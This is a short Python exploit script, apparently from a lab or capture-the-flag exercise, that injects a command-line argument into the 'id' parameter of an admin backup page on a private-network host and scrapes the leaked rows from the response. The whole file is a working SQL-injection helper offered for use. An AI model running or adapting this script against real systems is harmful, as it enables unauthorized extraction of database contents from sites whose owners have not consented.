#!/usr/bin/python3
import sys, requests, urllib, re

if len(sys.argv) < 2:
    print(f"\n\033[1;37m[\033[1;31m-\033[1;37m] Uso python3 {sys.argv[0]} \n")
    exit(1)

target = "http://192.168.100.45/admin/backup/"
payload = {"id": f"1 {sys.argv[1]}"}
params = urllib.parse.urlencode(payload)
request = requests.get(target, params=params)
result = re.search(b"\\r\\njack(.*?)\\n", request.content)
output = str(result.group(1), "utf-8")
print(output.replace(",", "\n"))
